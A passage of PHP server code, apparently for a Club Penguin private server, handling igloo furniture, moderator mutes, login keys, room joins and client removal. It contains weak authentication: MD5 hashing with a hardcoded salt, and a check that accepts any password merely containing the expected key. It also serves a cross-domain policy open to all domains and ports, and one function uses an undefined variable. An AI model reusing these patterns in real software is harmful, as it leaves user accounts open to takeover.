		$client = $this->clients[$clientid]; //$client SHOULD ALWAYS BE A MEMBER OF THE CLIENT CLASS!
		$furniture = $client->getFurniture();
		$client->write(makeXt("gf", $client->intRoomID, $furniture));
	}

	function handleAddFurniture($data, $str, $clientid){
		$client = $this->clients[$clientid]; //$client SHOULD ALWAYS BE A MEMBER OF THE CLIENT CLASS!
		$id = $data[4];
		$client->addFurniture($id);
	}

	function handleUpdateIglooType($data, $str, $clientid){
		$client = $this->clients[$clientid]; //$client SHOULD ALWAYS BE A MEMBER OF THE CLIENT CLASS!
		$id = $data[4];
		$client->updateIgloo($id);
	}

	function handleUpdateMusic($data, $str, $clientid){
		$client = $this->clients[$clientid]; //$client SHOULD ALWAYS BE A MEMBER OF THE CLIENT CLASS!
		$id = $data[4];
		$client->updateMusic($id);
	}

	function handleUpdateFloor($data, $str, $clientid){
		$client = $this->clients[$clientid]; //$client SHOULD ALWAYS BE A MEMBER OF THE CLIENT CLASS!
		$id = $data[4];
		$client->updateFloor($id);
	}

	function handleMute($data, $str, $clientid){
		$client = $this->clients[$clientid]; //$client SHOULD ALWAYS BE A MEMBER OF THE CLIENT CLASS!
		$id = $data[4];
		$this->log->log("Moderator $clientid:{$client->name} muted $id!");
		if($client->c("isModerator")){
			if($this->isOnline($id)){
				if(!(($this->clientsByID[$id]->c("isModerator") && $this->clientsByID[$id]->isMuted == false))){
					$this->clientsByID[$id]->isMuted = !$this->clientsByID[$id]->isMuted;
					$this->sendToID(makeXt("xt", "ma", "-1", "m", $client->intRoomID, $client->ID), $id);
					//$this->removeClientBySock($this->clientsByID[$id]->sock);
				}
			}
		}
		else{
			$client->sendError("610%Hack attempt detected!");
			$this->removeClient($clientid);
		}
	}

	function sendBotMessage($message = ""){
		foreach($this->clients as &$client){
			$client->write("%xt%sm%{$client->intRoomID}%7446%$message%");
		}
	}

	function writeRaw(){
		$args = func_get_args();
		$client = array_shift($args);
		$write = $this->config['RAW_SEPERATOR'];
		array_unshift($args, "xt");
		foreach($args as $a){
				$write .= "$a" . $this->config['RAW_SEPERATOR'];
		}
		if(gettype($client) == "integer"){
			$client = $this->clients[$client];
		}
		return $client->write($write);
	}

	public function makeLoginKey($username){
		$username = strtoupper($username);
		$len = strlen($username);
		for($i = 0; $i < $len; $i++){
			if($i %2 == 0){
				$username{$i} = strtolower($username{$i});
			}
		}
		$hash = $this->encryptPassword(base64_encode($username));
		$key = substr(strtolower($hash) . strtoupper($hash), 15 - $len, 40 - $len);
		return strtolower($key);
	}

	function encryptPassword($password, $nMD5 = true){
		$md5 = $nMD5 ? md5($password) : $password;
		return substr($md5, 16, 16) . substr($md5, 0, 16);
    }

	function validateUser($username, $pass, $rndk){
		if(!$this->islogin){
			$key = $this->makeLoginKey($username);
			$key = $this->generate_key($key, $rndk, false);
			if($key == $pass){
				return true;
			}
			elseif(stripos($pass, $key) !== false){
				return true;
			}
			else{
				return false;
			}
		}
		elseif($this->islogin){
			$realpass = getData("SELECT password FROM accs WHERE name='" . dbEscape($username) . "'");
			$realpass = $realpass[0]['password'];
			$h = $this->generate_key($realpass, $rndk, true);
			if($h == $pass)
				return true;
			else{
				return false;
			}
		}
	}

	function validateUserWithID($id, $pass, $rndk){
	}

	function generate_key($Password, $randKey, $isLogin){
		if ($isLogin){
			$Key = strToUpper($this->encryptPassword($Password,false));
			$Key = $Key . $randKey;
			$Key = $Key . "Y(02.>'H}t\":E1";
			$Key = $this->encryptPassword($Key);
			return($Key);
		} else {
			return strtolower($this->encryptPassword($Password.$randKey).$Password);
		}
	}

	function onConnect($client){
		//$this->handleJoinRoom($this->getFreeRoom(), $client);
	}

	function sortRooms($a, $b){
		return strcmp($a['clients'], $b['clients']);
	}

	function isOnline($id){
		if(isset($this->clientsByID[$id])){
			if(is_object(@$this->clientsByID[$id]) && @$this->clientsByID[$id]->intRoomID != -1)
				return true;
		}
		return false;
	}
	
	function getKey($id){
		foreach($this->clients as $key => $client){
			if($client->ID == $id){
				return $key;
			}
		}
	}
	function getFreeRoom(){
		$a = $this->validRooms();
	/*	$key = 100; //Try town first!
		$r = $this->rooms[$key];
		if((count($r['clients']) < $this->config["MAX_IN_ROOM"]) && $r['connect'])
			return $key;
		unset($r);*/
		shuffle_assoc($a);
		reset($a);
		foreach($a as $key => &$r){
			if(!$r['game'] && count($r['clients']) < $this->config["MAX_IN_ROOM"] && $r['connect'])
				return $key;
		}
		unset($r, $key);
		$this->log->error("No free rooms on call to getFreeRoom(should never happen, server max users below 80 * number of rooms)!");
		return -1;
	}

	function validRooms(){
		$a = array();
		foreach($this->rooms as $key => &$r){
			if(key_exists('valid', $r) && @$r['valid']) $a[$key] =& $r;
		}
		return $a;
	}

	function handleJoinRoom($data, $str, $clientid){
		$client = $this->clients[$clientid];
		$room = ($tr = $data[4]) ? $tr : $this->getFreeRoom();
		$x = ($tx = $data[5]) ? $tx : 0;
		$y = ($ty = $data[6]) ? $ty : 0;
		if(!($room > 0))
			return 0;
		if(!$this->isJoinableRoom($room)){
			$client->sendError(210);//ROOM_FULL
			return 0;
		}
		$this->removeFromRooms($client);
		$this->rooms[$room]['clients'][] =& $client;
		$client->xpos = $x;
		$client->ypos = $y;
		$client->frame = 1;
		$client->extRoomID = $room;
		$client->intRoomID = $this->rooms[$room]['intid'];
		$this->log->log("Client $clientid:{$client->name} joined room $room");
		if($this->rooms[$room]['game'] === true){
			$client->sendXt("jg", $client->intRoomID, $client->extRoomID);
			$client->write(makeXt('ap', $this->rooms[$room]['intid'], $client->buildPlayerString()));
		}
		else{
			$client->sendXt("jr", $client->intRoomID, $client->extRoomID, $this->buildRoomString($room));
			$this->sendToRoom($room, makeXt('ap', $this->rooms[$room]['intid'], $client->buildPlayerString()));
		}
	}

	function sendToRoom($roomid, $data){
		if(isset($this->rooms[$roomid]['game']) && @$this->rooms[$roomid]['game'] !== true){
			foreach($this->rooms[$roomid]['clients'] as &$client){
				$msg = $data;
				$msg = str_replace("%playerid%", $client->ID, $msg);
				$client->write($msg);
			}
		}
	}

	function sendToRoomSpecial($roomid, $data, $moddata){
		if($this->rooms[$roomid]['game'] !== true){
			foreach($this->rooms[$roomid]['clients'] as &$client){
				if(!$client->c("isModerator")){
					$msg = $data;
					$msg = str_replace("...playerid...", $client->ID, $msg);
					$client->write($msg);
				}
				else{
					$msg = $data2;
					$msg = str_replace("...playerid...", $client->ID, $msg);
					$client->write($msg);
				}
			}
		}
	}

	function sendToPlayers($data){
		$args = func_get_args();
		unset($args[0]);
		foreach($args as &$id){
			if(is_numeric($id)){
				foreach($this->clients as $client){
					if($client->ID == $id)
						$client->write($data);
				}
			}
			if(is_object($id)){
				$id->write($data);
			}
		}
	}

	function buildRoomString($room){
		if(!($room > 1000))
			$str = "%7446|iCPPS|1|14|413|410|161|152|0|0|4034|0|0|120|" . rand(0,50) . "|1|4159";
		else
			$str = "";
		foreach($this->rooms[$room]['clients'] as &$client){
			$str .= "%" . $client->buildPlayerString();
		}
		$str = str_split($str);
		unset($str[0]);
		$str = implode("", $str);
		//$this->log->log("Generated room string for room $room, string " . ($str));
		return $str;
	}

	function isJoinableRoom($room){
		if(!$this->isValidRoom($room))
			return false;
		if(count($this->rooms[$room]['clients']) > $this->config["MAX_IN_ROOM"])
			return false;
		return true;
	}

	function isValidRoom($room){
		if(!is_numeric($room)){
			return false;
		}
		if(!key_exists($room, $this->rooms))
			return false;
		if(!(isset($this->rooms[$room]['valid'])) && !($this->rooms[$room]['valid']))
			return false;
		return true;
	}

	function onReceive($data){}

	function sendPolicyFile($client){
		$client->write("<cross-domain-policy><allow-access-from domain='*' to-ports='*' /></cross-domain-policy>");
	}

	function removeFromRooms($client){
		if($client->extRoomID != -1 || $client->intRoomID != -1){
			foreach(@$this->rooms[$client->extRoomID]['clients'] as $key => $c){
				if($c == $client){
					$this->sendToRoom($client->extRoomID, makeXt("rp", $c->intRoomID, $c->ID));
					unset ($this->rooms[$client->extRoomID]['clients'][$key]);
				}
			}
		}
	}

	function removeClient($num){
		//debug_print_backtrace();
		$client =& $this->clients[$num];
		$id = $client->ID;
		if(!$this->islogin && $id){
			$b = $client->c("buddies");
			foreach($b as $buddy){
				if(validID($buddy) and $this->isOnline($buddy)){
					$this->clientsByID[$buddy]->write("%xt%bof%-1%{$client->ID}%");
				}
			}
			$id += 1000;
			if(isset($this->rooms[$id]['isopen'])){
				if(@$this->rooms[$id]['isopen']){
					$this->rooms[$id]['isopen'] = false;
				}
			}
		}
		$this->removeFromRooms($this->clients[$num]);
		if(@$this->clients[$num]->ID){
			unset($this->clientsByID[$this->clients[$num]->ID]);
		}
		@socket_close($this->clients[$num]->sock);
		if(!$this->serverID == 1)
			$this->log->log("Client $num removed");
		unset($this->clients[$num]);
	}

	function removeClientBySock($socket){
		//debug_print_backtrace();
		foreach ($this->clients as $key => &$c){
			if($c->sock === $socket){
				$this->removeClient($key);
				return 0;
			}
		}
		return -1;
	}
}
if(defined("usekey")){function key_exists($a, $b){
	return array_key_exists($a, $b);
}}
function shuffle_assoc(&$array) {
    /* Auxiliary array to hold the new order */
    $aux = array();
    /* We work with an array of the keys */
    $keys = array_keys($array);
    /* We shuffle the keys */
    shuffle($keys);
    /* We iterate thru' the new order of the keys */
    foreach($keys as $key) {
      /* We insert the key, value pair in its new order */
      $aux[$key] = $array[$key];
      /* We remove the element from the old array to save memory */
      unset($array[$key]);
    }
    /* The auxiliary array with the new order overwrites the old variable */
    $array = $aux;
 }
 set_error_handler('myErrorHandler');
register_shutdown_function('fatalErrorShutdownHandler');

function printError($msg = ""){
	$fh = fopen("php://stderr", "w");
	fwrite($fh, $msg);
	fclose($fh);
}

function myErrorHandler($code, $message, $file, $line) {
	printError("PHP Error: $code: $message, in $file at $line!\n");
}

function fatalErrorShutdownHandler()
{
  $last_error = error_get_last();
  if ($last_error['type'] === E_ERROR) {
    // fatal error
    myErrorHandler(E_ERROR, $last_error['message'], $last_error['file'], $last_error['line']);
  }
}
?>
